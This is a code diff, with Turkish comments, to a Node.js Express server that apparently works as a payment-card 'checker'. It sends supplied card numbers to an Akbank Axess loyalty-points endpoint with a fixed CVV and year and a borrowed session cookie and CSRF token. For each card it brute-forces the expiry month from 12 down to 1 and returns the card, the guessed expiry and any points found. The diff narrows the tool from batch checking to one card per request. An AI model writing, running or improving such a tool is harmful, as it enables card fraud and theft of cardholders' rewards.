@@ -4,7 +4,7 @@ const { URLSearchParams } = require('url');
 const fetch = require('node-fetch');
 const cors = require('cors'); 
 const app = express();
-// Render için portu dinamikleştiriyoruz: process.env.PORT
+// Render için dinamik port kullanımı
 const port = process.env.PORT || 3000; 
 
 // Sabitler
@@ -18,79 +18,78 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 /**
- * Kartı belirtilen ay ve yıl için kontrol eder.
- * @param {string} cardNumber Kontrol edilecek kart numarası.
- * @param {string} month Kontrol edilecek ay (01-12).
- * @param {string} year Kontrol edilecek yıl.
- * @param {Object} headers API çağrısı için dinamik HTTP başlıkları (Cookie içerir).
- * @param {string} csrfToken POST verisi içine konulacak CSRF değeri.
- * @returns {Promise<Object>} Puan durumunu içeren bir nesne.
+ * Tek bir kartı kontrol eder (12 aydan 1 aya doğru) ve bulunan ilk puanı döner.
  */
-async function checkCard(cardNumber, month, year, headers, csrfToken) {
-    const data = {
-        "banka": "akbank",
-        "cardtype": "2",
-        "cardname": "axess",
-        "cc_cvv": FIXED_CVV,
-        "taksit_sec": "1",
-        "cc_number": cardNumber,
-        "cc_month": month,
-        "cc_year": year,
-        "useAmountInt": "",
-        "useAmountDecimal": "",
-        "csrfToken": csrfToken // Dinamik olarak alınıyor
-    };
-
-    const body = new URLSearchParams(data).toString();
-
-    try {
-        const response = await fetch(API_URL, {
-            method: 'POST',
-            headers: headers,
-            body: body
-        });
-
-        const text = await response.text();
+async function checkSingleCard(cardNumber, headers, csrfToken) {
+    // Kartı 12. aydan 1. aya doğru döngüye al
+    for (let m = 12; m >= 1; m--) {
+        const month = m.toString().padStart(2, '0');
         
-        try {
-            const result = JSON.parse(text);
-            if (result && typeof result.amount === 'string' && parseFloat(result.amount) > 0) {
-                return { 
-                    success: true, 
-                    message: `✅ ${result.amount} Puan Bulundu!`,
-                    amount: result.amount
-                };
-            }
-        } catch (jsonError) {
-            // JSON parse hatası 
-        }
-    } catch (fetchError) {
-        // Network hatası
-        return { 
-            success: false, 
-            message: `⚠️ Bağlantı hatası: ${fetchError.message}`, 
-            amount: null 
+        const data = {
+            "banka": "akbank",
+            "cardtype": "2",
+            "cardname": "axess",
+            "cc_cvv": FIXED_CVV,
+            "taksit_sec": "1",
+            "cc_number": cardNumber,
+            "cc_month": month,
+            "cc_year": FIXED_YEAR,
+            "useAmountInt": "",
+            "useAmountDecimal": "",
+            "csrfToken": csrfToken 
         };
+
+        const body = new URLSearchParams(data).toString();
+
+        try {
+            const response = await fetch(API_URL, {
+                method: 'POST',
+                headers: headers,
+                body: body
+            });
+
+            const text = await response.text();
+            
+            try {
+                const result = JSON.parse(text);
+                if (result && typeof result.amount === 'string' && parseFloat(result.amount) > 0) {
+                    // Puan bulundu! Anında sonucu dön ve döngüyü sonlandır.
+                    return { 
+                        success: true, 
+                        cardNumber: cardNumber,
+                        expiry: `${month}/${FIXED_YEAR}`,
+                        amount: result.amount
+                    };
+                }
+            } catch (jsonError) {
+                // JSON parse hatası (genellikle puan yok demektir)
+            }
+        } catch (fetchError) {
+            // Network hatası
+            return { 
+                success: false, 
+                error: `Bağlantı hatası: ${fetchError.message}`
+            };
+        }
     }
     
-    return { success: false, message: "❌ Bu kart buz gibi...", amount: null };
+    // 12 ay denendi ve puan bulunamadı.
+    return { success: false, cardNumber: cardNumber, error: "Puan bulunamadı." };
 }
 
 /**
- * Express POST Rotası: Kart kontrol işlemini yapar
+ * Express POST Rotası: Sadece TEK BİR KART kontrolünü yapar.
  */
-app.post('/check_cards', async (req, res) => {
-    const inputCards = req.body.cards;
+app.post('/check_card', async (req, res) => {
+    const cardNumber = req.body.card; // Ön yüzden tekil kartı yakala
     
-    // Ön yüzden gönderilen özel HTTP başlıklarını yakala
     const cookieHeader = req.header('x-app-cookie');
     const csrfTokenValue = req.header('x-app-csrf');
 
-    if (!cookieHeader || !csrfTokenValue) {
-        return res.status(400).json({ error: "Oturum bilgileri (Cookie/CSRF) eksik. Lütfen ayarları kontrol edin." });
+    if (!cookieHeader || !csrfTokenValue || !cardNumber) {
+        return res.status(400).json({ error: "Eksik bilgi (Cookie, CSRF veya Kart Numarası)." });
     }
 
-    // Dinamik HTTP başlık nesnesini oluştur
     const dynamicHeaders = {
         "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
         "Cookie": cookieHeader,
@@ -101,31 +100,11 @@ app.post('/check_cards', async (req, res) => {
         "X-Requested-With": "XMLHttpRequest"
     };
     
-    const robustCards = [];
+    // Tek kartı kontrol et
+    const result = await checkSingleCard(cardNumber, dynamicHeaders, csrfTokenValue);
 
-    // Kartları sırayla döngüye al ve 12'den 1'e kadar ardışık dene
-    for (const card of inputCards) {
-        for (let m = 12; m >= 1; m--) {
-            const month = m.toString().padStart(2, '0');
-
-            const result = await checkCard(card, month, FIXED_YEAR, dynamicHeaders, csrfTokenValue); 
-            
-            if (result.success) {
-                robustCards.push({ 
-                    cardNumber: card, 
-                    expiry: `${month}/${FIXED_YEAR}`,
-                    amount: result.amount,
-                    message: result.message
-                });
-                break; // Puan bulundu, kalan ayları deneme
-            }
-        }
-    }
-
-    res.json({
-        totalChecked: inputCards.length,
-        robustCards: robustCards
-    });
+    // Sonucu ön yüze geri gönder
+    res.json(result);
 });
 
 
